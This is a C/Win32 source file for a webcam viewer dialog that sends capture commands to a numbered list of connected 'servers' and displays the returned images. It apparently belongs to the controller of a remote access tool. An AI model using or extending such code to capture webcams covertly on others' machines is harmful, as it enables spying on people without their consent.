#include "Main.h"
#include "resource.h"
#include "PacketHead.h"

void SetCamWindow(HWND hwnd)
{
	RECT rc;

	GetClientRect(hwnd, &rc);
	MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1), 0, rc.bottom - 20, rc.right - 200, 20, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_START), rc.right - 200, rc.bottom - 20, 50, 20, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_STOP), rc.right - 200, rc.bottom - 20, 50, 20, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_SINGLE), rc.right - 145, rc.bottom - 20, 50, 20, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_INTERVAL), rc.right - 90, rc.bottom - 20, 30, 20, TRUE);
	MoveWindow(GetDlgItem(hwnd, IDC_EDIT1), rc.right - 40, rc.bottom - 20, 40, 20, TRUE);
	return;
}

LRESULT CALLBACK WebCamWndProc(HWND Dlg,UINT Mes,WPARAM wParam,LPARAM lParam)
{
	char WindowId [12] = "";
	char Data [256] = "";
	RECT rc;    
	HBITMAP Final;
	HDC hdcBackground;
	INT ndcBackground;
	HDC hdc = 0;
	HDC hdcScreen;
	
	PAINTSTRUCT ps;
	HBITMAP hbmMem;
	INT ndcMem;
	HDC hdcMem;
	HICON hIcon;
	switch(Mes)
	{
	case WM_INITDIALOG:
		
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 16, 16, 0);
		SendMessage(Dlg, WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
		DeleteObject(hIcon);
		hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 64, 64, 0);
		SendMessage(Dlg, WM_SETICON,ICON_BIG,(LPARAM)hIcon);

		GetWindowRect(Dlg, &rc);
		MoveWindow(Dlg, rc.left, rc.top, 300, 300, TRUE);
		ZeroMemory(&rc, sizeof(RECT));
		ShowWindow(GetDlgItem( Dlg, IDC_START),SW_HIDE);
		ShowWindow(GetDlgItem( Dlg, IDC_SINGLESHOT),SW_HIDE);
		SetCamWindow(Dlg);
		GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 10);
	    FBISend(Server[atoi(WindowId)], "",  0, rc.right, rc.bottom - 20, WEBCAM_CAPTURE);		
		break;
		
	case WM_PAINT:
		{
			GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 10);
			GetClientRect(Dlg, (LPRECT) &rc);
			if(WebA[atoi(WindowId)] == NULL) return -1;
			hdcScreen = GetDC(HWND_DESKTOP);
			hdcBackground = CreateCompatibleDC(hdcScreen);
			ndcBackground = SaveDC(hdcBackground);
			SelectObject(hdcBackground, WebA[atoi(WindowId)]);
			ReleaseDC(HWND_DESKTOP, hdcScreen); 
			if(BeginPaint(Dlg, &ps)) 
			{
				// Create double buffer
				hdcMem = CreateCompatibleDC(ps.hdc);
				ndcMem = SaveDC(hdcMem);
				hbmMem = CreateCompatibleBitmap(ps.hdc, rc.right, rc.bottom - 20);
				SelectObject(hdcMem, hbmMem);
				
				// Copy background bitmap into double buffer
				if(BitBlt(hdcMem, 0, 0, rc.right, rc.bottom - 20, hdcBackground, 0, 0, SRCCOPY) == NULL)
				{
					//MessageBox(NULL, "failed", "FAILED", MB_OK);
				}
				//StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
				//Copy double buffer to screen
				if(BitBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 20, hdcMem, 0, 0, SRCCOPY) == NULL)
				{
					//	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
				}
				
				// Clean up
				RestoreDC(hdcMem, ndcMem);
				DeleteObject(hbmMem);
				DeleteObject(Final);
				DeleteDC(hdcMem);
				DeleteDC(hdcScreen);
				DeleteDC(hdc);
				EndPaint(Dlg, &ps);	
			}
			break;
		}
		break;

	case WM_COMMAND:
		switch(wParam)
		{			
		case IDC_START:
			SetWindowText(GetDlgItem(Dlg, IDC_SINGLESHOT), "0");
			GetClientRect(Dlg, &rc);
			GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 10);
			FBISend(Server[atoi(WindowId)], "",  0, rc.right, rc.bottom - 20, WEBCAM_CAPTURE);
			
			ShowWindow(GetDlgItem( Dlg, IDC_START),SW_HIDE);
			ShowWindow(GetDlgItem( Dlg, IDC_STOP),SW_SHOW);
			break;
		case IDC_STOP:
			SetWindowText(GetDlgItem(Dlg, IDC_SINGLESHOT), "1");
			GetClientRect(Dlg, &rc);
			GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 10);
			ShowWindow(GetDlgItem( Dlg, IDC_STOP),SW_HIDE);
			ShowWindow(GetDlgItem( Dlg, IDC_START),SW_SHOW);
			break;
		case IDC_SINGLE:
			GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 10);
			FBISend(Server[atoi(WindowId)], "",  0, 300, 280, WEBCAM_CAPTURE);
			SetWindowText(GetDlgItem(Dlg, IDC_SINGLESHOT), "1");
			ShowWindow(GetDlgItem( Dlg, IDC_STOP),SW_HIDE);
			ShowWindow(GetDlgItem( Dlg, IDC_START),SW_SHOW);
			break;
		case IDCANCEL:
			GetWindowText(GetDlgItem(Dlg, IDC_ID), WindowId, 12);
			Web[atoi(WindowId)] = NULL;
			EndDialog(Dlg, 0);
		break;
		}
		break;
	}
return 0;
}
DWORD WINAPI WebcamWindow(LPVOID lpParam)
{
	int LID = (int)lpParam;
	char WindowText [50] = "";
    char TID [12] = "";
	RECT rc;
	
	Web[LID]=CreateDialog(WebInst,(LPCTSTR)IDD_WEBCAM,NULL,(DLGPROC)WebCamWndProc);
	ShowWindow(Web[LID],SW_SHOW);
	ShowWindow(GetDlgItem(Web[LID], IDC_ID),SW_HIDE);
	
	sprintf(WindowText, "Webcam Viewer - %s", Information[LID].Buf3);
	SetWindowText(Web[LID], WindowText);
	
	sprintf(TID, "%d", LID);
	SetWindowText(GetDlgItem(Web[LID], IDC_ID), TID);
	
	GetClientRect(Web[LID], &rc);
	MSG msg;
	InitCommonControls();
	while(GetMessage(&msg,Web[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}